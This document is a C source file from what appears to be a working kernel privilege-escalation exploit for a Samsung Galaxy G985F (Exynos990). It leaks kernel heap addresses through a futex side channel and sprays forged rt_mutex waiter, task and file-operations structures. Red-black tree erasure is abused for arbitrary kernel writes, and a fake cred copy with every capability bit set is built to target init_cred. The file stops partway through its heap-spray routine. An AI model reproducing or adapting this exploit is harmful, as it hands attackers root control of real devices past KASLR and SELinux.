#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
#define G985F_KSNITCH_APPENDED_FUTEXES 256U
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static long long ms_since(struct timespec *t0) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0->tv_sec) * 1000LL +
         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
}

uintptr_t page_base;
uintptr_t last_mm_struct;
int last_kernel_page_prepare_attempt;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

int pselect_custom_write;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;  /* Preserve initialized bytes when set. */

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

void setup_kernelsnitch_sized(size_t mm_struct_size) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_size, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
  /* The G985F repeatedly reset while the original 1,024-thread fan-out was
   * still measuring collisions.  Its Exynos990 reliably has eight online
   * CPUs; 256 parked waiters retain a clear bucket signal while staying well
   * below the device's transient thread-pressure limit. */
  if (active_offsets && active_offsets->rt_sigreturn_route) {
    ks->appended_futexes = G985F_KSNITCH_APPENDED_FUTEXES;
    pr_info("[ks] G985F collision fan-out=%zu\n", ks->appended_futexes);
  }
}

void setup_kernelsnitch(void) {
  setup_kernelsnitch_sized(MM_STRUCT_SZ);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char cwd[256] = "unreadable";
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  if (!getcwd(cwd, sizeof(cwd))) {
    snprintf(cwd, sizeof(cwd), "unreadable");
  }
  int open_fds = -1;
  DIR *fd_dir = opendir("/proc/self/fd");
  if (fd_dir) {
    open_fds = 0;
    while (readdir(fd_dir) != NULL) open_fds++;
    closedir(fd_dir);
  }
  pr_success("startup shape pid=%d ppid=%d pgid=%d sid=%d fds=%d cwd=%s\n",
             getpid(), getppid(), getpgrp(), getsid(0), open_fds, cwd);
  const char *label = active_offsets && active_offsets->rt_sigreturn_route
                        ? "ghostlock_g985f_exynos990" : BUILD_VARIANT_LABEL;
  const char *route = active_offsets && active_offsets->rt_sigreturn_route
                        ? "rt_sigreturn" : "pselect";
  pr_success("build config pid=%d label=%s slide=tracefs main=%s\n",
             getpid(), label, route);
  if (active_offsets && active_offsets->diagnostic_only) {
    pr_warning("physical mapping unverified; no physical-address profile is active\n");
    return;
  }
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

/* Bootloader-selected physical load address. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

/* Selected entry's init_cred image address. */
uintptr_t g_init_cred_image;
uint64_t runtime_memstart_addr;
uint64_t runtime_kimage_voffset;
int runtime_phys_ready;

void init_p0_profile(void) {
  if (active_offsets && active_offsets->canonical_data) {
    pr_info("runtime physmap deferred: page_offset=%016llx memstart/voffset will be read through configfs\n",
            (unsigned long long)P0_PAGE_OFFSET);
    return;
  }
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  if (active_offsets && active_offsets->canonical_data) {
    uintptr_t canonical = text_addr(image_addr);
    if (!runtime_phys_ready) return canonical;
    uintptr_t phys = canonical - runtime_kimage_voffset;
    return P0_PAGE_OFFSET + (phys - runtime_memstart_addr);
  }
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  if (active_offsets && active_offsets->canonical_data) {
    uintptr_t canonical = data_alias;
    if (runtime_phys_ready && is_direct_ptr(data_alias)) {
      uintptr_t phys = runtime_memstart_addr + (data_alias - P0_PAGE_OFFSET);
      canonical = phys + runtime_kimage_voffset;
    }
    return canonical - kaslr_base;
  }
  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  if (active_offsets && active_offsets->canonical_data &&
      !runtime_phys_ready) return data_alias;
  return kaslr_base + p0_alias_image_offset(data_alias);
}

long sched_setscheduler_batch_tid(int tid) {
  struct sched_param param;
  memset(&param, 0, sizeof(param));
  errno = 0;
  long ret = syscall(SYS_sched_setscheduler, tid, SCHED_BATCH, &param);
  if (ret != 0) {
    pr_error("sched_setscheduler(%d,BATCH) ret=%ld errno=%d\n",
             tid, ret, errno);
  }
  return ret;
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    put64(c, CRED_CAPS_OFF + i * 8, 0xFFFFFFFFFFFFFFFFULL);
  }
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF,
        CONFIGFS_LEGACY_RW ? text_addr(CONFIGFS_READ) : 0);
  put64(p, off + FOPS_WRITE_OFF,
        CONFIGFS_LEGACY_RW ? text_addr(CONFIGFS_BIN_WRITE) : 0);
  put64(p, off + FOPS_READ_ITER_OFF,
        CONFIGFS_LEGACY_RW ? 0 : text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF,
        CONFIGFS_LEGACY_RW ? 0 : text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(int payload_mode) {
  (void)payload_mode;
  int prepare_slabs = 8;
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  int controlled_pi_probe = active_offsets &&
      active_offsets->rt_sigreturn_route &&
      pselect_custom_write == RTSIG_CONTROLLED_PI_PROBE_MODE;
  if (pselect_custom_write) {
    if (controlled_pi_probe) {
      /* Chain-check only: W0 is the childless black root of
       * fake_task.pi_waiters.  Removing this sole root needs no rebalance and
       * cannot escape the controlled page. */
      fake_parent = 1;
      fake_right = 0;
      fake_left = 0;
    } else if (pselect_child_node) {
      if (pselect_custom_write == 2) {
        /* W2 uses init_cred; resolve it from the selected device entry. */
        fake_right = data_addr(g_init_cred_image);
      } else {
        /* W1 targets the initialized page at base+0x100. */
        fake_right = base + 0x100;
      }
    } else {
      fake_right = 0;  /* leaf: write 0 */
    }
    if (!controlled_pi_probe) {
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      /* rb_node::__rb_parent_color carries the parent pointer plus the low
       * color bits. Linux encodes RB_RED as bit 0 clear and RB_BLACK as bit 0
       * set. The target is parent->rb_right (parent + 8); keep the forged leaf
       * red so __rb_erase_augmented() performs only that child-pointer write. */
      fake_parent = pselect_custom_target - 8;
    }
    if (!pselect_custom_value) {
      pselect_custom_value = fake_fops;
    }
  } else {
    /* This parent is a forged RB node inside the payload.  A clear color bit
     * marks the child red and keeps rb_erase_augmented() on its no-rebalance
     * path. */
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
  }
  binwrite_target = payload_base + SCRATCH_OFF;

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  uint64_t waiter_task = active_offsets && active_offsets->rt_sigreturn_route
                           ? fake_task : text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  /* Keep the legacy 4.19 PI chain fully inside the controlled page.  After
   * insertion, task_top_pi_waiter(fake_task)->task is fake_task itself; the
   * matching cached pointer and 120/120 priorities make rt_mutex_setprio()
   * return before deriving or locking a real runqueue from the synthetic
   * task.  Newer profiles retain their established init_task anchor. */
  uint64_t pi_top_task = active_offsets && active_offsets->rt_sigreturn_route
                           ? fake_task : text_addr(INIT_TASK);

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    put64(p, LOCK_OFF + 0x18, fake_task | 1);

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    if (WAITER_LEGACY_4_19) {
      /* Stock Samsung 4.19 rt_mutex_waiter (0x50): rb nodes at 0x00/0x18,
       * task 0x30, lock 0x38, prio 0x40 and deadline 0x48. */
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_LEGACY_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_LEGACY_DEADLINE_OFF, 0);
    } else if (WAITER_COMPACT) {
      /* 6.1 compact rt_mutex_waiter (0x58): pi_tree_entry 0x18, task 0x30,
       * lock 0x38, wake_state 0x40, prio 0x44, deadline 0x48, ww_ctx 0x50. */
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF + 0x04, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + 0x48, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    } else {
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    /* The controlled probe gives W0 a coherent black-root membership so its
     * erase cannot escape the reclaimed page.  The arbitrary-write shape
     * deliberately leaves these cached-root fields empty. */
    uint64_t pi_root = controlled_pi_probe
                         ? fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF : 0;
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, pi_root);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_root);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    put_fake_fops_table(p, FOPS_TABLE_OFF);
    if (pselect_custom_write == 2) {
      fill_init_cred_copy(p, CRED_COPY_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  struct timespec t_spray;
  clock_gettime(CLOCK_MONOTONIC, &t_spray);
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs(payload_mode);

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  setup_kernelsnitch_sized(MM_STRUCT_SZ);
  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(&t_spray));

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("[spray] finding futex collisions... +%lldms\n",
          ms_since(&t_spray));
  {
    struct timespec t_wait;
    clock_gettime(CLOCK_MONOTONIC, &t_wait);
    int leak_status = 0;
    pid_t wp = 0;
    long long last_beat = 0;
    for (;;) {
      wp = waitpid(child_leak, &leak_status, WNOHANG);
      if (wp == child_leak) {
        break;
      }
      if (wp < 0) {
        pr_warning("waitpid leak child: %m\n");
        break;
      }
      long long waited = ms_since(&t_wait);
      if (waited >= 60000) {
        pr_warning("leak child stuck >60s, killing it\n");
        kill(child_leak, SIGKILL);
        waitpid(child_leak, NULL, 0);
        break;
      }
      if (waited - last_beat >= 2000) {
        size_t scan_done = ks->scan_done;
        size_t scan_total = ks->total_futexes;
        if (scan_done > scan_total) scan_done = scan_total;
        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
        pr_info("[spray]   still finding collisions (%llds) %zu%% "
                "(futex 0x%zx/0x%zx)...\n",
                waited / 1000,
                scan_total ? scan_done * 100 / scan_total : 0,
                scan_id, (size_t)FUTEX_SZ);
        last_beat = waited;
      }
      usleep(50000);
    }
    if (wp == child_leak &&
        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
      pr_warning("leak child exit status=%d\n", leak_status);
    }
  }
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("[spray] futex collisions not found\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  pr_info("[spray] futex collisions found +%lldms\n",
          ms_since(&t_spray));
  kernelsnitch_bruteforce(ks);
  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
          (size_t)ks->mm_struct, ms_since(&t_spray));
  uintptr_t leaked = ks->mm_struct;
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
